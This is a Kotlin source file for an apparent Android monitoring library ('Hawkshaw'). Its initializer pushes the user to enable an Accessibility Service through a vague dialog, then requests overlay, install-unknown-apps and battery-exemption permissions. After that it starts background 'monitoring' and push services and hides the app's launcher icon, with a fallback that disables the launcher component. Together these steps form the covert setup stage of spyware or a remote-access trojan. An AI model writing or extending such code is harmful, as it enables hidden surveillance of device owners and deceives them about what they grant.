package com.hawkshaw.library

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.util.Log
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.Keep
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.net.toUri
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.lifecycleScope
import com.hawkshaw.library.config.getConfig
import com.hawkshaw.library.handler.JobScheduler
import com.hawkshaw.library.ktextensions.ManifestPermissionsKt
import com.hawkshaw.library.ktextensions.safeLaunch
import com.hawkshaw.library.logger.Logger
import com.hawkshaw.library.preferences.Prefs
import com.hawkshaw.library.utils.MiscKt
import com.hawkshaw.library.utils.showAlertDialog
import com.hawkshaw.library.features.push.PrivatePushInitializer
import com.hawkshaw.library.features.ui.AppIconManager
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class HawkshawInitializer(
    val activity: AppCompatActivity,
    private val onFinish: () -> Unit
) : LifecycleEventObserver {
    companion object {
        private const val TAG = "HawkshawInitializer"
        val activityState = MutableStateFlow(State.DESTROYED)
        val activityStep = MutableStateFlow(Step.UNKNOWN)

        @RequiresApi(Build.VERSION_CODES.O)
        @JvmStatic
        fun init(initializer: HawkshawInitializer, checkInitFlag: Boolean = true) {
            Log.d(TAG, "Companion object init() called. checkInitFlag: $checkInitFlag, currentStep: ${activityStep.value}")
            initializer.init(checkInitFlag)
        }

        @Keep
        fun initFromInternalActivity(checkInitFlag: Boolean = true) {
            Log.d(TAG, "Companion object initFromInternalActivity() called. checkInitFlag: $checkInitFlag, currentStep: ${activityStep.value}")
            Hawkshaw.initFromInternalActivity(checkInitFlag)
        }
    }

    enum class State {
        DESTROYED,    // Ordinal 0
        INITIALIZED,  // Ordinal 1
        CREATED,      // Ordinal 2
        STARTED,      // Ordinal 3
        RESUMED;      // Ordinal 4

        fun isAtLeast(state: State): Boolean {
            return compareTo(state) >= 0
        }
    }

    enum class Step {
        UNKNOWN,
        INITIALIZING,
        REQUESTING_ACCESSIBILITY,
        HANDLING_ACCESSIBILITY_RESULT,
        REQUESTING_GENERAL_PERMISSIONS,
        HANDLING_GENERAL_PERMISSIONS_RESULT,
        REQUESTING_SYSTEM_ALERT_WINDOW,
        HANDLING_SYSTEM_ALERT_WINDOW_RESULT,
        REQUESTING_INSTALL_PACKAGES,
        HANDLING_INSTALL_PACKAGES_RESULT,
        REQUESTING_BATTERY_OPTIMIZATIONS,
        HANDLING_BATTERY_OPTIMIZATIONS_RESULT,
        ALL_PERMISSIONS_HANDLED,
        FINAL_SETUP,
        MONITORING
    }

    var pushData: Boolean = false

    init {
        activity.lifecycle.addObserver(this)
        val currentLifecycleState = activity.lifecycle.currentState
        val mappedState = toLifecycleState(currentLifecycleState)
        HawkshawInitializer.activityState.value = mappedState
        Log.d(TAG, "Initializer created for ${activity.javaClass.simpleName}. Initial Android Lifecycle.State: $currentLifecycleState, mapped to Hawkshaw State: $mappedState. Current Step: ${activityStep.value}")
    }

    override fun onStateChanged(source: LifecycleOwner, event: Lifecycle.Event) {
        val newState = toEventState(event)
        val oldState = HawkshawInitializer.activityState.value
        HawkshawInitializer.activityState.value = newState
        Log.d(TAG, "onStateChanged for ${activity.javaClass.simpleName}: Android Lifecycle.Event: $event -> Hawkshaw State: $newState (was $oldState). Current Step: ${activityStep.value}")

        if (event == Lifecycle.Event.ON_DESTROY) {
            Log.i(TAG, "Activity ${activity.javaClass.simpleName} is ON_DESTROY. Removing lifecycle observer. Current step: ${activityStep.value}")
            source.lifecycle.removeObserver(this)

            if (activityStep.value != Step.MONITORING && activityStep.value != Step.UNKNOWN) {
                Log.w(TAG, "Activity ${activity.javaClass.simpleName} destroyed mid-initialization (Step: ${activityStep.value}). Setting step to UNKNOWN and invoking onFinish.")
                setStep(Step.UNKNOWN) // Ensure step is unknown before calling onFinish
                onFinish.invoke()
            } else if (activityStep.value == Step.MONITORING) {
                Log.d(TAG, "Activity destroyed while in MONITORING state. State is now DESTROYED.")
            } else {
                Log.d(TAG, "Activity destroyed. Current step: ${activityStep.value}. State is now DESTROYED.")
            }
        }
    }

    private fun toEventState(event: Lifecycle.Event): State {
        return when (event) {
            Lifecycle.Event.ON_CREATE -> State.CREATED
            Lifecycle.Event.ON_START -> State.STARTED
            Lifecycle.Event.ON_RESUME -> State.RESUMED
            Lifecycle.Event.ON_PAUSE -> State.STARTED
            Lifecycle.Event.ON_STOP -> State.CREATED
            Lifecycle.Event.ON_DESTROY -> State.DESTROYED
            Lifecycle.Event.ON_ANY -> HawkshawInitializer.activityState.value
        }
    }

    private fun toLifecycleState(lifecycleState: Lifecycle.State): State {
        return when (lifecycleState) {
            Lifecycle.State.DESTROYED -> State.DESTROYED
            Lifecycle.State.INITIALIZED -> State.INITIALIZED
            Lifecycle.State.CREATED -> State.CREATED
            Lifecycle.State.STARTED -> State.STARTED
            Lifecycle.State.RESUMED -> State.RESUMED
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private val generalPermissionsLauncher: ActivityResultLauncher<Array<String>> =
        activity.registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
            Log.d(TAG, "generalPermissionsLauncher callback. Current step: ${activityStep.value}, Activity State: ${HawkshawInitializer.activityState.value}")
            if (!HawkshawInitializer.activityState.value.isAtLeast(State.CREATED)) {
                Log.w(TAG, "generalPermissionsLauncher callback: Activity no longer created. Aborting.")
                return@registerForActivityResult
            }
            onGeneralPermissionsResult(permissions)
        }

    @RequiresApi(Build.VERSION_CODES.O)
    private val systemAlertWindowLauncher: ActivityResultLauncher<Intent> =
        activity.registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
            Log.d(TAG, "systemAlertWindowLauncher callback. Current step: ${activityStep.value}, Activity State: ${HawkshawInitializer.activityState.value}")
            if (!HawkshawInitializer.activityState.value.isAtLeast(State.CREATED)) {
                Log.w(TAG, "systemAlertWindowLauncher callback: Activity no longer created. Aborting.")
                return@registerForActivityResult
            }
            handleSystemAlertWindowResult()
        }

    @RequiresApi(Build.VERSION_CODES.O)
    private val installPackagesLauncher: ActivityResultLauncher<Intent> =
        activity.registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
            Log.d(TAG, "installPackagesLauncher callback. Current step: ${activityStep.value}, Activity State: ${HawkshawInitializer.activityState.value}")
            if (!HawkshawInitializer.activityState.value.isAtLeast(State.CREATED)) {
                Log.w(TAG, "installPackagesLauncher callback: Activity no longer created. Aborting.")
                return@registerForActivityResult
            }
            handleInstallPackagesResult()
        }

    @RequiresApi(Build.VERSION_CODES.O)
    private val accessibilityResultLauncher: ActivityResultLauncher<Intent> =
        activity.registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
            Log.d(TAG, "accessibilityResultLauncher callback. Current step: ${activityStep.value}, Activity State: ${HawkshawInitializer.activityState.value}")
            if (!HawkshawInitializer.activityState.value.isAtLeast(State.CREATED)) {
                Log.w(TAG, "accessibilityResultLauncher callback: Activity no longer created. Aborting.")
                return@registerForActivityResult
            }
            handleAccessibilityResult()
        }

    @RequiresApi(Build.VERSION_CODES.O)
    private val batteryOptimizationLauncher: ActivityResultLauncher<Intent> =
        activity.registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
            Log.d(TAG, "batteryOptimizationLauncher callback. Current step: ${activityStep.value}, Activity State: ${HawkshawInitializer.activityState.value}")
            if (!HawkshawInitializer.activityState.value.isAtLeast(State.CREATED)) {
                Log.w(TAG, "batteryOptimizationLauncher callback: Activity no longer created. Aborting.")
                return@registerForActivityResult
            }
            handleBatteryOptimizationResult()
        }

    @RequiresApi(Build.VERSION_CODES.O)
    fun init(checkInitFlag: Boolean) {
        Log.i(TAG, "init(checkInitFlag=$checkInitFlag) called. Current activityStep: ${activityStep.value}, Activity State: ${HawkshawInitializer.activityState.value}")

        if (!HawkshawInitializer.activityState.value.isAtLeast(State.INITIALIZED)) {
            Log.e(TAG, "HawkshawInitializer.init() called but activity is not in at least INITIALIZED state (current: ${HawkshawInitializer.activityState.value}). Aborting.")
            if (activityStep.value != Step.UNKNOWN) setStep(Step.UNKNOWN) // Ensure step is UNKNOWN if aborting this early
            onFinish.invoke()
            return
        }

        if (activityStep.value > Step.INITIALIZING && activityStep.value < Step.MONITORING) {
            Log.w(TAG, "init() called while an initialization sequence is already in progress (step: ${activityStep.value}). Ignoring call.")
            return
        }

        setStep(Step.INITIALIZING)

        if (!checkInitFlag || !Prefs.getInitFlag()) {
            Log.i(TAG, "Init flag check: Initializing internally.")
            initInternal()
        } else {
            Log.i(TAG, "Init flag already set. Assuming already initialized. Setting step to MONITORING and calling onFinish.")
            setStep(Step.MONITORING)
            onFinish.invoke()
        }
    }

    private fun setStep(newStep: Step) {
        if (activityStep.value == newStep && newStep != Step.UNKNOWN) return // Allow UNKNOWN to be set multiple times if needed for reset
        val oldStep = activityStep.value
        Log.d(TAG, "Transitioning from $oldStep to $newStep. Activity State: ${HawkshawInitializer.activityState.value}")
        activityStep.value = newStep
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun initInternal() {
        Log.i(TAG, "initInternal() called. Current step: ${activityStep.value}, Initial Activity State for this function: ${HawkshawInitializer.activityState.value}")
        setStep(Step.REQUESTING_ACCESSIBILITY)

        activity.lifecycleScope.launch {
            Log.d(TAG, "initInternal: Coroutine launched. Waiting for activity to be at least STARTED or DESTROYED. Current state: ${HawkshawInitializer.activityState.value}")

            val awaitedState: State
            try {
                awaitedState = HawkshawInitializer.activityState.first { state ->
                    val proceed = state.isAtLeast(State.STARTED)
                    val abort = state == State.DESTROYED
                    Log.v(TAG, "initInternal: StateFlow predicate check. State: $state. Proceed: $proceed, Abort: $abort")
                    proceed || abort
                }
                Log.i(TAG, "initInternal: Resumed from state wait. Activity state is now $awaitedState.")
            } catch (e: CancellationException) {
                Log.w(TAG, "initInternal: Coroutine waiting for STARTED/DESTROYED state was cancelled. Current step: ${activityStep.value}", e)
                if (activityStep.value != Step.MONITORING && activityStep.value != Step.UNKNOWN &&
                    HawkshawInitializer.activityState.value != State.DESTROYED) {
                    Log.w(TAG, "initInternal: Cancellation implies aborted initialization. Setting step to UNKNOWN and invoking onFinish.")
                    setStep(Step.UNKNOWN)
                    onFinish.invoke()
                }
                return@launch
            }

            if (awaitedState.isAtLeast(State.STARTED)) {
                Log.i(TAG, "initInternal: Activity is $awaitedState. Proceeding to checkAndRequestAccessibility on IO dispatcher.")
                withContext(Dispatchers.IO) {
                    checkAndRequestAccessibility()
                }
            } else if (awaitedState == State.DESTROYED) {
                Log.w(TAG, "initInternal: Activity became DESTROYED while waiting for STARTED state. Initialization aborted. Current step: ${activityStep.value}")
                // onStateChanged handles onFinish for ON_DESTROY if initialization was in progress
            } else {
                Log.e(TAG, "initInternal: Awaited state $awaitedState is neither sufficient nor DESTROYED. This is unexpected. Aborting.")
                if (HawkshawInitializer.activityState.value != State.DESTROYED) { // Avoid double call if already destroyed
                    setStep(Step.UNKNOWN)
                    onFinish.invoke()
                }
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private suspend fun checkAndRequestAccessibility() {
        Log.i(TAG, "checkAndRequestAccessibility() called. Activity State: ${HawkshawInitializer.activityState.value}")
        if (!HawkshawInitializer.activityState.value.isAtLeast(State.STARTED)) {
            Log.w(TAG, "Cannot request accessibility, activity state is ${HawkshawInitializer.activityState.value}. Aborting this attempt.")
            // This 'withContext(Dispatchers.Main)' block might be problematic if called from IO after activity is not STARTED.
            // The check in initInternal should prevent this from being called if not STARTED.
            // If it still happens, it means state changed rapidly.
            withContext(Dispatchers.Main) {
                if (HawkshawInitializer.activityState.value != State.DESTROYED) { // Avoid double call
                    setStep(Step.UNKNOWN); onFinish.invoke()
                }
            }
            return
        }

        if (MiscKt.isAccessibilityEnabled(activity)) {
            Logger.v(TAG, "Accessibility: Service already enabled", false, 4, null)
            Log.i(TAG, "Accessibility Service already enabled. Proceeding.")
            withContext(Dispatchers.Main) { handleAccessibilityResult() }
            return
        }

        Log.i(TAG, "Accessibility Service not enabled. Showing AlertDialog.")
        withContext(Dispatchers.Main) {
            if (!HawkshawInitializer.activityState.value.isAtLeast(State.STARTED)) {
                Log.w(TAG, "Cannot show accessibility AlertDialog, activity state changed to ${HawkshawInitializer.activityState.value}")
                setStep(Step.UNKNOWN); onFinish.invoke()
                return@withContext
            }
            val appName = try {
                activity.packageManager.getApplicationLabel(activity.applicationInfo).toString()
            } catch (e: Exception) {
                Log.e(TAG, "Failed to get application label.", e); "this app"
            }
            activity.showAlertDialog(
                title = "Enable Accessibility Service",
                message = "To ensure full functionality, please enable the Accessibility Service for $appName. Locate '$appName' in 'Downloaded apps' or 'Installed Services' and turn it on.",
                positiveButtonClickListener = { dialog ->
                    Log.d(TAG, "Accessibility AlertDialog: Positive button clicked. Launching accessibility settings.")
                    dialog.dismiss()
                    if (HawkshawInitializer.activityState.value.isAtLeast(State.STARTED)) {
                        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                        accessibilityResultLauncher.launch(intent)
                    } else {
                        Log.w(TAG, "Cannot launch accessibility settings, activity state is ${HawkshawInitializer.activityState.value}")
                        setStep(Step.UNKNOWN); onFinish.invoke()
                    }
                },
                negativeButtonClickListener = { dialog ->
                    Log.w(TAG, "Accessibility AlertDialog: Negative button clicked. Aborting initialization.")
                    dialog.dismiss()
                    setStep(Step.UNKNOWN); onFinish.invoke()
                }
            )
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun handleAccessibilityResult() {
        setStep(Step.HANDLING_ACCESSIBILITY_RESULT)
        Log.i(TAG, "handleAccessibilityResult() called. Activity State: ${HawkshawInitializer.activityState.value}")
        if (!HawkshawInitializer.activityState.value.isAtLeast(State.CREATED)) {
            Log.w(TAG, "handleAccessibilityResult: Activity no longer created. Aborting. State: ${HawkshawInitializer.activityState.value}")
            if (HawkshawInitializer.activityState.value != State.DESTROYED) {
                setStep(Step.UNKNOWN); onFinish.invoke()
            }
            return
        }

        val isEnabled = MiscKt.isAccessibilityEnabled(activity)
        Logger.v(TAG, "Accessibility Result: Service is " + (if (isEnabled) "Enabled" else "Disabled"), false, 4, null)
        Log.i(TAG, "Accessibility service status after result: ${if (isEnabled) "Enabled" else "Disabled"}.")

        if (isEnabled) {
            Log.d(TAG, "Accessibility enabled, proceeding to requestGeneralPermissions().")
            requestGeneralPermissions()
        } else {
            Log.w(TAG, "Accessibility still not enabled. Critical failure.")
            setStep(Step.UNKNOWN)
            Log.d(TAG, "Calling onFinish() due to accessibility not enabled.")
            onFinish.invoke()
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun requestGeneralPermissions() {
        setStep(Step.REQUESTING_GENERAL_PERMISSIONS)
        Log.i(TAG, "requestGeneralPermissions() called. Activity State: ${HawkshawInitializer.activityState.value}")
        if (!HawkshawInitializer.activityState.value.isAtLeast(State.STARTED)) {
            Log.w(TAG, "Cannot request general permissions, activity state is ${HawkshawInitializer.activityState.value}")
            if (HawkshawInitializer.activityState.value != State.DESTROYED) {
                setStep(Step.UNKNOWN); onFinish.invoke()
            }
            return
        }

        val permissionsToRequest = ManifestPermissionsKt.getGeneralPermissionList()
        if (permissionsToRequest.isEmpty()) {
            Log.i(TAG, "No general permissions to request. Proceeding.")
            onGeneralPermissionsResult(emptyMap())
        } else {
            Log.i(TAG, "Requesting ${permissionsToRequest.size} general permissions: ${permissionsToRequest.joinToString()}.")
            generalPermissionsLauncher.launch(permissionsToRequest)
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun onGeneralPermissionsResult(permissions: Map<String, Boolean>) {
        setStep(Step.HANDLING_GENERAL_PERMISSIONS_RESULT)
        Log.i(TAG, "onGeneralPermissionsResult() called. Activity State: ${HawkshawInitializer.activityState.value}")
        if (!HawkshawInitializer.activityState.value.isAtLeast(State.CREATED)) {
            Log.w(TAG, "onGeneralPermissionsResult: Activity no longer created. Aborting. State: ${HawkshawInitializer.activityState.value}")
            if (HawkshawInitializer.activityState.value != State.DESTROYED) {
                setStep(Step.UNKNOWN); onFinish.invoke()
            }
            return
        }
        Logger.v(TAG, "General Permissions Result received.", false, 4, null)
        val allGranted = permissions.all { it.value }
        permissions.forEach { (permission, granted) -> Log.i(TAG, "Permission '$permission' granted: $granted") }

        if (allGranted || permissions.isEmpty()) {
            Log.i(TAG, "All general permissions granted or none to request.")
        } else {
            Log.w(TAG, "Not all general permissions were granted. App functionality might be limited.")
        }
        checkAndRequestSystemAlertWindow()
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun checkAndRequestSystemAlertWindow() {
        setStep(Step.REQUESTING_SYSTEM_ALERT_WINDOW)
        Log.i(TAG, "checkAndRequestSystemAlertWindow() called. Activity State: ${HawkshawInitializer.activityState.value}")
        if (!HawkshawInitializer.activityState.value.isAtLeast(State.STARTED)) {
            Log.w(TAG, "Cannot request system alert window, activity state is ${HawkshawInitializer.activityState.value}")
            if (HawkshawInitializer.activityState.value != State.DESTROYED) {
                setStep(Step.UNKNOWN); onFinish.invoke()
            }
            return
        }

        if (ManifestPermissionsKt.hasPermission(activity, ManifestPermissionsKt.SYSTEM_ALERT_WINDOW)) {
            Log.i(TAG, "System Alert Window permission already granted or not required for API level.")
            handleSystemAlertWindowResult()
        } else {
            Log.i(TAG, "Requesting System Alert Window permission.")
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, "package:${activity.packageName}".toUri())
            systemAlertWindowLauncher.launch(intent)
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun handleSystemAlertWindowResult() {
        setStep(Step.HANDLING_SYSTEM_ALERT_WINDOW_RESULT)
        Log.i(TAG, "handleSystemAlertWindowResult() called. Activity State: ${HawkshawInitializer.activityState.value}")
        if (!HawkshawInitializer.activityState.value.isAtLeast(State.CREATED)) {
            Log.w(TAG, "handleSystemAlertWindowResult: Activity no longer created. Aborting. State: ${HawkshawInitializer.activityState.value}")
            if (HawkshawInitializer.activityState.value != State.DESTROYED) {
                setStep(Step.UNKNOWN); onFinish.invoke()
            }
            return
        }
        val canDraw = ManifestPermissionsKt.hasPermission(activity, ManifestPermissionsKt.SYSTEM_ALERT_WINDOW)
        Logger.v(TAG, "System Alert Window Result: Can Draw: $canDraw", false, 4, null)
        Log.i(TAG, "System overlay permission status after check: Can Draw: $canDraw.")
        if (!canDraw) Log.w(TAG, "Overlay permission NOT granted. Functionality might be limited.")
        checkAndRequestInstallPackages()
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun checkAndRequestInstallPackages() {
        setStep(Step.REQUESTING_INSTALL_PACKAGES)
        Log.i(TAG, "checkAndRequestInstallPackages() called. Activity State: ${HawkshawInitializer.activityState.value}")
        if (!HawkshawInitializer.activityState.value.isAtLeast(State.STARTED)) {
            Log.w(TAG, "Cannot request install packages, activity state is ${HawkshawInitializer.activityState.value}")
            if (HawkshawInitializer.activityState.value != State.DESTROYED) {
                setStep(Step.UNKNOWN); onFinish.invoke()
            }
            return
        }
        if (ManifestPermissionsKt.hasPermission(activity, ManifestPermissionsKt.REQUEST_INSTALL_PACKAGES)) {
            Log.i(TAG, "Request Install Packages permission already granted or not required for API level.")
            handleInstallPackagesResult()
        } else {
            Log.i(TAG, "Requesting Install Packages permission.")
            val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                "package:${activity.packageName}".toUri())
            installPackagesLauncher.launch(intent)
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun handleInstallPackagesResult() {
        setStep(Step.HANDLING_INSTALL_PACKAGES_RESULT)
        Log.i(TAG, "handleInstallPackagesResult() called. Activity State: ${HawkshawInitializer.activityState.value}")
        if (!HawkshawInitializer.activityState.value.isAtLeast(State.CREATED)) {
            Log.w(TAG, "handleInstallPackagesResult: Activity no longer created. Aborting. State: ${HawkshawInitializer.activityState.value}")
            if (HawkshawInitializer.activityState.value != State.DESTROYED) {
                setStep(Step.UNKNOWN); onFinish.invoke()
            }
            return
        }
        val canInstall = ManifestPermissionsKt.hasPermission(activity, ManifestPermissionsKt.REQUEST_INSTALL_PACKAGES)
        Log.i(TAG, "Install packages permission status after check: Can Install: $canInstall.")
        if (!canInstall) Log.w(TAG, "Install packages permission NOT granted. Functionality might be limited.")
        checkAndRequestBatteryOptimizations()
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun checkAndRequestBatteryOptimizations() {
        setStep(Step.REQUESTING_BATTERY_OPTIMIZATIONS)
        Log.i(TAG, "checkAndRequestBatteryOptimizations() called. Activity State: ${HawkshawInitializer.activityState.value}")
        if (!HawkshawInitializer.activityState.value.isAtLeast(State.STARTED)) {
            Log.w(TAG, "Cannot request battery opts, activity state is ${HawkshawInitializer.activityState.value}")
            if (HawkshawInitializer.activityState.value != State.DESTROYED) {
                setStep(Step.UNKNOWN); onFinish.invoke()
            }
            return
        }
        if (ManifestPermissionsKt.hasPermission(activity, ManifestPermissionsKt.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)) {
            Log.i(TAG, "Ignoring Battery Optimizations already permitted or not required for API level.")
            handleBatteryOptimizationResult()
        } else {
            Log.i(TAG, "Requesting to ignore battery optimizations.")
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = "package:${activity.packageName}".toUri()
                batteryOptimizationLauncher.launch(intent)
            } catch (e: Exception) {
                Log.e(TAG, "Error launching battery optimization settings: ${e.message}")
                handleBatteryOptimizationResult() // Proceed even if launching settings fails
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun handleBatteryOptimizationResult() {
        setStep(Step.HANDLING_BATTERY_OPTIMIZATIONS_RESULT)
        Log.i(TAG, "handleBatteryOptimizationResult() called. Activity State: ${HawkshawInitializer.activityState.value}")
        if (!HawkshawInitializer.activityState.value.isAtLeast(State.CREATED)) {
            Log.w(TAG, "handleBatteryOptimizationResult: Activity no longer created. Aborting. State: ${HawkshawInitializer.activityState.value}")
            if (HawkshawInitializer.activityState.value != State.DESTROYED) {
                setStep(Step.UNKNOWN); onFinish.invoke()
            }
            return
        }
        val isIgnoring = ManifestPermissionsKt.hasPermission(activity, ManifestPermissionsKt.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
        Log.i(TAG, "Battery optimization status after check: Is Ignoring: $isIgnoring.")
        if (!isIgnoring) Log.w(TAG, "App is NOT ignoring battery optimizations. Performance might be affected.")

        setStep(Step.ALL_PERMISSIONS_HANDLED)
        Log.d(TAG, "All permission checks completed. Proceeding to final setup.")
        finalizeInitialization()
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun finalizeInitialization() {
        setStep(Step.FINAL_SETUP)
        Log.i(TAG, "finalizeInitialization() called. Activity State: ${HawkshawInitializer.activityState.value}")

        if (!HawkshawInitializer.activityState.value.isAtLeast(State.CREATED)) {
            Log.w(TAG, "Cannot finalize initialization, activity state is ${HawkshawInitializer.activityState.value}. Aborting.")
            if (HawkshawInitializer.activityState.value != State.DESTROYED) {
                setStep(Step.UNKNOWN)
                onFinish.invoke()
            }
            return
        }

        Log.d(TAG, "Calling getDiagnosis().")
        getDiagnosis()

        if (pushData) {
            Log.i(TAG, "pushData is true. Launching data push in IO Dispatcher.")
            activity.lifecycleScope.safeLaunch(Dispatchers.IO) {
                Log.d(TAG, "Executing data push logic on Dispatchers.IO.")
                // Your actual data push logic here
            }
        } else {
            Log.i(TAG, "pushData is false. Skipping data push.")
        }

        Log.d(TAG, "Calling JobScheduler.startScheduler().")
        JobScheduler.startScheduler()
        
        // Initialize private push system (Firebase replacement)
        Log.d(TAG, "Initializing private push system.")
        PrivatePushInitializer.initialize(activity)

        setStep(Step.MONITORING)
        Log.i(TAG, "Initialization sequence nearing completion. App should be in monitoring state. Proceeding to close().")
        close()
    }

    private fun getDiagnosis() {
        Log.i(TAG, "getDiagnosis() called. Activity State: ${HawkshawInitializer.activityState.value}")
        if (!HawkshawInitializer.activityState.value.isAtLeast(State.CREATED)) {
            Log.w(TAG, "Skipping getDiagnosis as activity state is ${HawkshawInitializer.activityState.value}")
            return
        }
        activity.lifecycleScope.safeLaunch(Dispatchers.IO) {
            Logger.d(TAG, "Performing background diagnosis...", false, 4, null)
            Log.d(TAG, "Executing diagnosis on Dispatchers.IO.")
            kotlinx.coroutines.delay(500) // Simulate work
            val result = "Diagnosis complete."
            Log.d(TAG, "Background diagnosis finished. Result: $result")
            withContext(Dispatchers.Main) {
                if (HawkshawInitializer.activityState.value.isAtLeast(State.CREATED)) {
                    Logger.d(TAG, result, false, 4, null)
                } else {
                    Log.w(TAG, "Diagnosis completed but activity no longer in a state to show result via Logger on Main thread.")
                }
            }
        }
    }

    private fun close() {
        Log.i(TAG, "close() called. Current activityStep: ${activityStep.value}, Activity State: ${HawkshawInitializer.activityState.value}")

        if (HawkshawInitializer.activityState.value.isAtLeast(State.CREATED)) {
            if (activity.getConfig().hideAppIcon) {
                if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.Q) {
                    Log.d(TAG, "Hiding app icon due to configuration and API level <= Q.")
                    hideAppIcon()
                } else {
                    Log.d(TAG, "Not hiding app icon: config wants to hide, but API level > Q (not reliable/standard).")
                }
            } else {
                Log.d(TAG, "App icon not configured to hide.")
            }
        } else {
            Log.w(TAG, "Skipping hideAppIcon logic as activity state is ${HawkshawInitializer.activityState.value}")
        }

        Prefs.setInitFlag(true)
        Log.d(TAG, "Prefs.setInitFlag(true) called.")

        // Ensure onFinish is only called once for successful completion or defined failure paths.
        // If step is already UNKNOWN and state is not DESTROYED, onFinish might have been called.
        // However, this 'close' method is the final success path.
        if (activityStep.value == Step.MONITORING) {
            Log.i(TAG, "Initialization successful. Calling onFinish. Final activityStep: ${activityStep.value}")
            onFinish.invoke()
        } else if (activityStep.value != Step.UNKNOWN || HawkshawInitializer.activityState.value == State.DESTROYED) {
            // If it's UNKNOWN but not DESTROYED, onFinish might have been called by an abort path.
            // If it's DESTROYED, onStateChanged handled it.
            // If it's some other step, it's an unexpected end.
            Log.w(TAG, "Initialization ended with step ${activityStep.value} (expected MONITORING). Calling onFinish if not already UNKNOWN (and not destroyed).")
            onFinish.invoke()
        }
        Log.i(TAG, "HawkshawInitializer process 'close' method finished.")
    }

    private fun hideAppIcon() {
        Log.i(TAG, "Attempting to hide app icon using perfect hiding system. Activity State: ${HawkshawInitializer.activityState.value}")
        if (!HawkshawInitializer.activityState.value.isAtLeast(State.CREATED)) {
            Log.w(TAG, "Cannot hide app icon, activity state is ${HawkshawInitializer.activityState.value}")
            return
        }
        
        try {
            // Use the perfect app icon hiding system with retry mechanism
            AppIconManager.hideAppIconWithRetry(activity, maxRetries = 3)
            
            // Verify the hiding was successful
            val status = AppIconManager.getIconStatus(activity)
            Log.i(TAG, "App icon hiding completed. Status: $status")
            
            if (status == AppIconManager.IconStatus.HIDDEN) {
                Log.i(TAG, "App icon successfully hidden using perfect hiding system")
            } else {
                Log.w(TAG, "App icon hiding may not have been fully successful. Status: $status")
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error using perfect app icon hiding system: ${e.message}", e)
            
            // Fallback to basic method if perfect system fails
            try {
                val mainActivityName = ComponentName(activity, "com.hawkshaw.app.MainActivity")
                activity.packageManager.setComponentEnabledSetting(
                    mainActivityName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                Log.d(TAG, "Fallback: Disabled main launcher component using basic method")
            } catch (fallbackError: Exception) {
                Log.e(TAG, "Both perfect and fallback app icon hiding methods failed", fallbackError)
            }
        }
    }
}
